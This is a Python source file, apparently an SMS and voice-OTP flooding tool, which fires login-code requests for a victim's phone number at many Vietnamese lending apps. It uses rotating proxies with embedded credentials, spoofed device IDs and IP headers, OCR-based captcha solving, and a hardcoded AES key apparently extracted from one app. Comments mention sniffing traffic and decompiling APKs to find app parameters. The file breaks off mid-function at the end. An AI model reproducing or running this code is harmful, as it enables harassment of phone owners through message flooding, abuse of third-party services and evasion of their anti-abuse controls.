import sys
import hmac
import random
import string
import httpx
import asyncio
import time
import uuid
import base64
import hashlib
import json
import io
import unicodedata
from typing import Optional, Any
from urllib.parse import urlparse
from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image, ImageEnhance
import ddddocr

ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr = ddddocr.DdddOcr(show_ad=False)



_PROXIES = [
    {
        "proxy": "http://omXE3FBH:f13URJtd9I@sv1.proxysocks5.vn:49205",
        "change_ip_url": "https://api.proxysocks5.vn/api/proxy/changeIp?tokenProxy=5N8XUbxcvDsDBMqFVF49k",
    }
]

_proxy_index = 0


def _current_proxy() -> str:
    return _PROXIES[_proxy_index]["proxy"]


def _current_change_ip_url() -> str:
    return _PROXIES[_proxy_index]["change_ip_url"]


def _rotate_proxy_index() -> None:
    global _proxy_index
    _proxy_index = (_proxy_index + 1) % len(_PROXIES)


_OK1_MAX_CONCURRENT = 300
_ok1_semaphore: Optional[asyncio.Semaphore] = None


def _get_ok1_semaphore() -> asyncio.Semaphore:
    global _ok1_semaphore
    if _ok1_semaphore is None:
        _ok1_semaphore = asyncio.Semaphore(_OK1_MAX_CONCURRENT)
    return _ok1_semaphore


class _ClientCtx:
    def __init__(self, **kw):
        self._kw = kw
        self._client: Optional[httpx.AsyncClient] = None
        self._sem: Optional[asyncio.Semaphore] = None

    async def __aenter__(self) -> httpx.AsyncClient:
        self._sem = _get_ok1_semaphore()
        await self._sem.acquire()
        kw = self._kw.copy()
        kw.setdefault("http2", False)
        self._client = httpx.AsyncClient(**kw)
        return await self._client.__aenter__()

    async def __aexit__(self, *args):
        try:
            if self._client is not None:
                await self._client.__aexit__(*args)
        finally:
            if self._sem is not None:
                self._sem.release()


def _make_client(**kw) -> _ClientCtx:
    return _ClientCtx(**kw)


async def _doi_ip():
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(_current_change_ip_url())
        print(f"[ChangeIP] {r.status_code}  ")
        _rotate_proxy_index()
    except Exception as e:
        print(f"Okay")


_XMH_UA_POOL = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
]

_IOS_CFNETWORK = [
    ("1568.300.101", "24.2.0"),
    ("1568.200.51", "24.1.0"),
    ("1490.0.4", "23.6.0"),
    ("1490.0.4", "23.5.0"),
    ("1480.0.4", "23.4.0"),
]

HO = [
    "Nguyễn", "Trần", "Lê", "Phạm", "Hoàng", "Huỳnh", "Phan",
    "Vũ", "Võ", "Đặng", "Bùi", "Đỗ", "Hồ", "Ngô", "Dương"
]
TEN_DEM = [
    "Văn", "Thị", "Minh", "Quốc", "Thanh", "Ngọc", "Gia",
    "Đức", "Hữu", "Anh", "Tuấn", "Bảo", "Kim", "Xuân"
]
TEN = [
    "An", "Bình", "Dũng", "Hùng", "Huy", "Khánh", "Long",
    "Nam", "Phúc", "Quân", "Sơn", "Thành", "Thắng", "Tú",
    "Việt", "Linh", "Lan", "Trang", "Mai", "Hương",
    "Phương", "Nhung", "Thảo", "Yến", "Ngân"
]



def _rand_ua() -> str:
    return random.choice(_XMH_UA_POOL)


def random_vietnamese_name():
    return f"{random.choice(HO)} {random.choice(TEN_DEM)} {random.choice(TEN)}"


def remove_accents(text):
    return ''.join(
        c for c in unicodedata.normalize("NFD", text)
        if unicodedata.category(c) != "Mn"
    )


def generate_email():
    full_name = random_vietnamese_name()
    username = remove_accents(full_name).lower().replace(" ", "")
    username += str(random.randint(10000, 99999))
    return f"{username}@gmail.com"


email_ok = generate_email()


def get_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))


def get_random_ipv6():
    return ":".join(format(random.randint(0, 65535), "x") for _ in range(8))


def _random_android_id() -> str:
    return "".join(random.choices("0123456789abcdef", k=32))


def gen_device_id():
    return str(uuid.uuid4()).upper()


def _qq_solve(b64_str: str) -> str:
    def _ocr_buf(pil_img) -> str:
        buf = io.BytesIO()
        pil_img.convert("RGB").save(buf, format="PNG")
        r = _ocr.classification(buf.getvalue())
        return r.strip() if isinstance(r, str) else ""

    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        candidates = []
        r1 = _ocr_buf(img)
        if len(r1) >= 4:
            return r1
        candidates.append(r1)
        r2 = _ocr_buf(ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0))
        if len(r2) >= 4:
            return r2
        candidates.append(r2)
        r3 = _ocr_buf(img.convert("L").convert("RGB"))
        if len(r3) >= 4:
            return r3
        candidates.append(r3)
        r4 = _ocr_buf(ImageEnhance.Contrast(img.convert("L").convert("RGB")).enhance(3.0))
        if len(r4) >= 4:
            return r4
        candidates.append(r4)
        return str(max(candidates, key=len))
    except Exception:
        return ""


def _t24h_jwt_remaining(tok: str) -> int:
    try:
        import base64 as _b64
        seg = tok.split(".")[1]
        seg += "=" * (4 - len(seg) % 4)
        exp = json.loads(_b64.b64decode(seg)).get("exp", 0)
        return max(0, exp - int(time.time()))
    except Exception:
        return 0


def _load_appcheck_token(app_id: str) -> str:
    import pathlib as _pl
    p = _pl.Path(__file__).parent / "tokens.json"
    if not p.exists():
        print(f"[tokens.json]  Khng tm thy {p}  chy grab-jwt trc")
        return ""
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        for app in data.get("apps", []):
            if app.get("id") == app_id:
                tok = app.get("firebaseAppCheck") or ""
                if not tok:
                    print(f"[tokens.json]   [{app_id}] cha c token  chy grab-jwt trc")
                    return ""
                remaining = _t24h_jwt_remaining(tok)
                if remaining > 120:
                    return tok
                print(f"[tokens.json]   [{app_id}] token ht hn ({remaining}s cn li)  chy grab-jwt refresh")
                return ""
        print(f"[tokens.json]   Khng tm thy app_id='{app_id}' trong {p}")
        return ""
    except Exception as e:
        print(f"[tokens.json]  Li c {p}: {e}")
        return ""

_CV2_AND_UA_POOL = [
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B)",
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-S901B)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Xiaomi 13 Pro)",
    "Dalvik/2.1.0 (Linux; U; Android 15; POCO X6 Pro)",
]


def _cv2_hdrs(origin: str, mode: str = "android") -> dict:
    ua = _XMH_UA_POOL if mode == "ios" else random.choice(_CV2_AND_UA_POOL)
    base = origin.rstrip("/")
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "User-Agent": ua,
        "Origin": base,
        "Referer": base + "/",
        "X-Device-Id": str(uuid.uuid4()),
        "X-Device-ID-Alt": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": get_random_ip(),
        "Connection": "keep-alive",
    }


async def _cv2_send(
    phone: str,
    api_url: str,
    payload: dict,
    label: str,
    origin: str = "",
    mode: str = "android",
    extra_hdrs: dict | None = None,
) -> bool:
    try:
        hdrs = _cv2_hdrs(origin or api_url.split("/v2")[0], mode)
        if extra_hdrs:
            hdrs.update(extra_hdrs)
        async with httpx.AsyncClient(timeout=20, proxy=_current_proxy()) as client:
            r = await client.post(api_url, json=payload, headers=hdrs)
        biz_code = ""
        try:
            d = r.json()
            biz_code = str(d.get("code", ""))
            ok = biz_code in ("200", "0")
            msg = d.get("message", "")
        except Exception:
            ok = r.status_code in (200, 201)
            msg = r.text[:200].replace("\n", " ")
        return ok
    except Exception as exc:
        print(f"[{label}] ERR {type(exc).__name__}: {exc}")
        return False


#  App-Send core 
_APP_UA_IOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
_APP_UA_CF  = "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0"
_APP_UA_CF2 = "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0"


def _xmh_local_phone(phone: str) -> str:
    p = phone.lstrip("+")
    if p.startswith("84"):
        p = "0" + p[2:]
    elif not p.startswith("0"):
        p = "0" + p
    return p


def _app_body_full(ownership: str, app_version: str = "1.0.0"):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": app_version,
            "androidversion": "iOS18.1",
            "webVersion": "1.0.0",
            "deviceID": str(uuid.uuid4()).upper(),
            "uuid": uuid.uuid4().hex,
            "pagingData": 0,
            "exquisiteItemType": 1,
            "ownerShip": ownership,
            "token": "",
            "phoneNo": phone,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
        }
    return _build


def _app_body_simple(ownership: str):
    def _build(phone: str, figure_veri) -> dict:
        return {
            "i18n": "vi_VN",
            "reqSource": "Ios",
            "phoneName": "iPhone13,3",
            "appVersion": "1.1.0",
            "ownerShip": ownership,
            "veriType": "LOGIN",
            "figureVeri": figure_veri,
            "phoneNo": phone,
        }
    return _build


async def _app_send(
    phone: str,
    base_url: str,
    endpoint: str,
    headers_fn,
    make_body,
    label: str,
    cap_key: str = "captcha",
    proxy=None,
    _retry: bool = True,
) -> bool:
    def _msg(d, r):
        return d.get("message") or r.text[:80]

    if proxy is None:
        proxy = _current_proxy()

    try:
        async with _make_client(timeout=20, follow_redirects=True, proxy=proxy) as c:
            r1 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, False)
            )
            d1 = r1.json() if r1.status_code == 200 else {}
            if str(d1.get("code", "")) == "0":
                print(f"  [{label}] ✓ {phone}")
                return True
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f"  [{label}] ✗ {phone}  {d1.get('message') or r1.status_code}")
                return False
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f"[{label}] OCR fail  captcha len={len(cap_b64)}")
                return False
            r2 = await c.post(
                f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, answer)
            )
            d2 = r2.json() if r2.status_code == 200 else {}
            ok = str(d2.get("code", "")) == "0"
            print(f"  [{label}] {'✓' if ok else '✗'} {phone}  {d2.get('message') or r2.status_code}")
            return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        if _retry:
            print(f"[{label}] retry lan 2...")
            return await _app_send(
                phone, base_url, endpoint, headers_fn, make_body, label,
                cap_key=cap_key, proxy=proxy, _retry=False,
            )
        return False


#  QuickQuang 
_QQ_APP_BASE = "https://ang.quickquangapp.com"


def _qq_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "quiquang_ios",
        "Origin": _QQ_APP_BASE,
        "Referer": _QQ_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_qq_app_body = _app_body_full("quiquang_ios")


async def Call_QQ_SMS(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getSMSCode", _qq_app_hdrs, _qq_app_body, "QQ-SMS"
    )


async def Call_QQ_Voice(phone):
    return await _app_send(
        phone, _QQ_APP_BASE, "/base/xmh/getVoiceCode", _qq_app_hdrs, _qq_app_body, "QQ-Voice"
    )


#  WanPay Financial 
_WAN_APP_BASE = "https://wan.wanpaya.com"


def _wan_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "wanpayFinancial_ios",
        "Origin": _WAN_APP_BASE,
        "Referer": _WAN_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_wan_app_body = _app_body_full("wanpayFinancial_ios")


async def Call_Wan_SMS(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getSMSCode", _wan_app_hdrs, _wan_app_body, "Wan-SMS"
    )


async def Call_Wan_Voice(phone):
    return await _app_send(
        phone, _WAN_APP_BASE, "/base/xmh/getVoiceCode", _wan_app_hdrs, _wan_app_body, "Wan-Voice"
    )


#  PtVayNhanh 
_PTV_APP_BASE = "https://app.phuthinhvay.com"


def _ptv_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encrypttype": "0",
        "disturbedurl": "0",
        "disturbedpar": "0",
        "ownership": "PTVayNhanh_ios",
        "User-Agent": _APP_UA_CF,
    }


_ptv_app_body = _app_body_simple("PTVayNhanh_ios")


async def Call_PTV_SMS(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/JHkuyNids/RlhiPz",
        _ptv_app_hdrs, _ptv_app_body, "PTV-SMS", cap_key="jmJiSn2D1",
    )


async def Call_PTV_Voice(phone):
    return await _app_send(
        phone, _PTV_APP_BASE, "/lvjKRH/brRsY/getVoiceCode",
        _ptv_app_hdrs, _ptv_app_body, "PTV-Voice",
    )


#  LaviFinance 
_LAVI_APP_BASE = "https://tin.lavifinancecompany.com"


def _lavi_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "identity",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "laviFinance_ios",
        "Origin": _LAVI_APP_BASE,
        "Referer": _LAVI_APP_BASE + "/",
        "User-Agent": _APP_UA_CF2,
    }


_lavi_app_body_raw = _app_body_full("laviFinance_ios")


def _lavi_app_body(phone: str, figure_veri):
    return _lavi_app_body_raw(_xmh_local_phone(phone), figure_veri)


async def Call_Lavi_SMS(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getSMSCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-SMS"
    )


async def Call_Lavi_Voice(phone):
    return await _app_send(
        phone, _LAVI_APP_BASE, "/base/xmh/getVoiceCode", _lavi_app_hdrs, _lavi_app_body, "Lavi-Voice",
    )


#  VayNhanh 
_VAY_NHANH_BASE = "https://lend.vtnhanh.com"


def _vay_nhanh_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "vtnhanh_ios",
        "Origin": _VAY_NHANH_BASE,
        "Referer": _VAY_NHANH_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_vnhanh_app_body = _app_body_full("vtnhanh_ios")


async def Vay_Nhanh_SMS(phone):
    return await _app_send(
        phone, _VAY_NHANH_BASE, "/base/xmh/getSMSCode",
        _vay_nhanh_hdrs, _vnhanh_app_body, "VayNhanh-SMS",
    )


async def Vay_Nhanh_Voice(phone):
    return await _app_send(
        phone, _VAY_NHANH_BASE, "/base/xmh/getVoiceCode",
        _vay_nhanh_hdrs, _vnhanh_app_body, "VayNhanh-Voice",
    )


#  FBFinance (PublicBankAMC) 
_FB_FINANCE_BASE = "https://max.vpamc.com"


def _fb_finance_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "publicbankamc_ios",
        "Origin": _FB_FINANCE_BASE,
        "Referer": _FB_FINANCE_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_fbfinance_app_body = _app_body_full("publicbankamc_ios")


async def FB_Finance_SMS(phone):
    return await _app_send(
        phone, _FB_FINANCE_BASE, "/base/xmh/getSMSCode",
        _fb_finance_hdrs, _fbfinance_app_body, "FBFinance-SMS",
    )


async def FB_Finance_Voice(phone):
    return await _app_send(
        phone, _FB_FINANCE_BASE, "/base/xmh/getVoiceCode",
        _fb_finance_hdrs, _fbfinance_app_body, "FBFinance-Voice",
    )

# App: "Tiền Phong Linh Hoạt" – Android package: com.miducoinvestment.loan.vn
# ownerShip cần sniff từ traffic thật hoặc decompile APK.
# Candidates: "tienphonglinhhoa_ios" | "miducotienphong_ios" | "tienphong_ios"
# (tgyz_ios là sai – trả về 9999 "Thông tin không đầy đủ")
_TP_APP_BASE      = "https://vne.miducoinvestment.com"
_TP_OWNERSHIP     = "tienphonglinhhoa_ios"   # TODO: xác nhận bằng traffic sniff


def _tp_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": _TP_OWNERSHIP,
        "Origin": _TP_APP_BASE,
        "Referer": _TP_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_tp_app_body = _app_body_full(_TP_OWNERSHIP)


async def Call_TP_SMS(phone):
    return await _app_send(
        phone, _TP_APP_BASE, "/base/xmh/getSMSCode", _tp_app_hdrs, _tp_app_body, "TP-SMS"
    )



#  SeaBankAsset 
_SEABANK_ASSET_BASE = "https://lend.seabankassetcompany.com"




def _seabankasset_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "i18n": "hi_IN",
        "reqSource": "Ios",
        "ownerShip": "sealend_ios",
        "encrypted": "0",
        "encryptType": "1",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Origin": "http://lend.seabankassetcompany.com",
        "Referer": "http://lend.seabankassetcompany.com/",
    }


_seabank_app_body = _app_body_full("sealend_ios")



async def seabankasset(phone):
    return await _app_send(
        phone, _SEABANK_ASSET_BASE, "/base/xmh/getSMSCode",
        _seabankasset_hdrs, _seabank_app_body, "SeaBank-SMS",
    )

#  AChauLoan 
_ACHAU_APP_BASE = "https://tien.achauloan.com"


def _achau_app_hdrs():
    return {
        "Accept": "*/*",
        "disturbedurl": "0",
        "encrypttype": "1",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "encrypted": "0",
        "Content-Type": "application/json",
        "User-Agent": "vetnam_xingxing_01/6 CFNetwork/1568.200.51 Darwin/24.1.0",
        "ownership": "AChauLoan_ios",
        "disturbedpar": "1",
    }


def _achau_app_body(phone, figure_veri):
    return {
        "reqSource": "Ios",
        "phoneName": "iPhone",
        "appVersion": "1.2.9",
        "androidversion": "iOS 18.1",
        "deviceID": str(uuid.uuid4()).upper(),
        "i18n": "vi-VN",
        "phoneNo": _xmh_local_phone(phone),
        "veriType": "LOGIN",
        "figureVeri": figure_veri,
    }


async def Call_AChau_SMS(phone):
    return await _app_send(
        phone, _ACHAU_APP_BASE, "/AQadQ/Jfmb/goMXd/IuGP",
        _achau_app_hdrs, _achau_app_body, "AChau-SMS",
    )


#  PetroVay (GPAMCloan) 
_PETRO_APP_BASE = "https://loan.gpamcloan.com"


def _petro_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "GPAMCloan_ios",
        "Origin": _PETRO_APP_BASE,
        "Referer": _PETRO_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_petro_app_body = _app_body_full("GPAMCloan_ios", "1.1.4")


async def Call_Petro_SMS(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getSMSCode",
        _petro_app_hdrs, _petro_app_body, "Petro-SMS",
    )


async def Call_Petro_Voice(phone):
    return await _app_send(
        phone, _PETRO_APP_BASE, "/base/xmh/getVoiceCode",
        _petro_app_hdrs, _petro_app_body, "Petro-Voice",
    )


_blue = "https://max.blueshiploan.com"


def _blue_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "miducovaytien_ios",
        "Origin": _blue,
        "Referer": _blue + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_blue_app_body = _app_body_full("miducovaytien_ios", app_version="1.0.2")


async def Call_Blue_SMS(phone):
    return await _app_send(
        phone, _blue, "/base/xmh/getSMSCode",
        _blue_hdrs, _blue_app_body, "Blue-SMS",
    )




#  Hataco (HTC) 
_HTC_APP_BASE = "https://tin.hatacocompany.com"


def _htc_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "hatacovay_ios",
        "Origin": _HTC_APP_BASE,
        "Referer": _HTC_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_htc_app_body = _app_body_full("hatacovay_ios", app_version="1.0.2")


async def Call_HTC_SMS(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getSMSCode",
        _htc_app_hdrs, _htc_app_body, "HTC-SMS",
    )


async def Call_HTC_Voice(phone):
    return await _app_send(
        phone, _HTC_APP_BASE, "/base/xmh/getVoiceCode",
        _htc_app_hdrs, _htc_app_body, "HTC-Voice",
    )



# App tại pho.tienphongcompany.com – có thể là app khác với com.miducoinvestment.loan.vn
# ownerShip chưa xác định – cần sniff traffic từ app Android tương ứng
_TIENPHONG_APP_BASE  = "https://pho.tienphongcompany.com"
_TIENPHONG_OWNERSHIP = "TODO_sniff_ownerShip"  # cần sniff – "tgyz_ios" sai


def _tienphong_app_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": _TIENPHONG_OWNERSHIP,
        "Origin": _TIENPHONG_APP_BASE,
        "Referer": _TIENPHONG_APP_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_tienphong_app_body = _app_body_full(_TIENPHONG_OWNERSHIP)


async def Call_TienPhong_SMS(phone):
    if _TIENPHONG_OWNERSHIP.startswith("TODO"):
        print("[TienPhong] SKIP – chưa có ownerShip thật (sửa _TIENPHONG_OWNERSHIP)")
        return False
    return await _app_send(
        phone, _TIENPHONG_APP_BASE, "/base/xmh/getSMSCode",
        _tienphong_app_hdrs, _tienphong_app_body, "TienPhong-SMS",
    )


async def Call_TienPhong_Voice(phone):
    if _TIENPHONG_OWNERSHIP.startswith("TODO"):
        print("[TienPhong] SKIP – chưa có ownerShip thật (sửa _TIENPHONG_OWNERSHIP)")
        return False
    return await _app_send(
        phone, _TIENPHONG_APP_BASE, "/base/xmh/getVoiceCode",
        _tienphong_app_hdrs, _tienphong_app_body, "TienPhong-Voice",
    )


_MARVAY_NEW_BASE = "https://new.marttimeassrt.com"




def _marvay_new_hdrs():
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "encrypted": "0",
        "encryptType": "0",
        "disturbedUrl": "1",
        "disturbedPar": "1",
        "ownerShip": "MarFinyo_ios",
        "Origin": _MARVAY_NEW_BASE,
        "Referer": _MARVAY_NEW_BASE + "/",
        "User-Agent": random.choice(_XMH_UA_POOL),
    }


_marvay_new_body = _app_body_full("MarFinyo_ios", "1.0.2")


async def Call_MarVay_New(phone):
    return await _app_send(
        phone, _MARVAY_NEW_BASE, "/base/xmh/getSMSCode",
        _marvay_new_hdrs, _marvay_new_body, "MarVay-New",
    )


async def call8(phone):
    headers = {
        "Host": "mvvii.marttimeassrt.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="130", "Not?A_Brand";v="99"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "sec-ch-ua-platform": "iOS",
        "Origin": "https://ios-h5.marttimeassrt.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ios-h5.marttimeassrt.com/",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
    payload = {
        "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn", "platform": "android",
        "app_id": "266000001", "type": 2
    }
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.post(
                "https://mvvii.marttimeassrt.com/v2/login/captcha",
                json=payload, headers=headers,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[call8] ERR {type(e).__name__}: {e}")
        return False


async def call1(phone):
    headers = {
        "Host": "mvvii.marttimeassrt.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="130", "Not?A_Brand";v="99"',
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "sec-ch-ua-platform": "iOS",
        "Origin": "https://ios-h5.marttimeassrt.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ios-h5.marttimeassrt.com/",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
    payload = {
        "country_code": "vi",
        "phone": phone,
        "app_name": "Mar Vay",
        "packagename": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
        "baseurl": "https://mvvii.marttimeassrt.com/",
        "weburl": "https://mvviw.marttimeassrt.com/",
        "logo": "assets/dialog/voice_phone.png"
    }
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.post(
                "https://mvvii.marttimeassrt.com/v2/login/captcha",
                json=payload, headers=headers,
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[call1] ERR {type(e).__name__}: {e}")
        return False


#  VVay AES-CBC core 
_VVAY_KEY = b"aajiaozicashmeh5"
_VVAY_IV  = b"hajiaozicashmeh5"


def _vvay_encrypt(data) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, indent=2, separators=(",", " : "))
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(data.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_encrypt_path(path: str) -> str:
    ct = AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).encrypt(pad(path.encode(), 16))
    return base64.b64encode(ct).decode()


def _vvay_decrypt(b64_str: str):
    ct = base64.b64decode(b64_str)
